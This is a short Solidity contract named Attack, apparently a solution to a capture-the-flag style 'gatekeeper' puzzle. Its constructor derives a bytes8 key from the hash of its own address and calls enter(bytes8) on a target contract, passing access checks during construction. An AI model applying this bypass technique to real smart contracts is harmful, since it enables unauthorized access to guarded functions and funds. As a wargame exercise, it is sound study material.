// SPDX-License-Identifier: MIT
pragma solidity ^0.6.3;

contract Attack {
  
    constructor(address gateKeeper) public {
        bytes8 _gateKey = bytes8(uint64(0)-1 ^ uint64(bytes8(keccak256(abi.encodePacked(address(this))))));
        gateKeeper.call(abi.encodeWithSignature("enter(bytes8)",_gateKey)); 
    }
}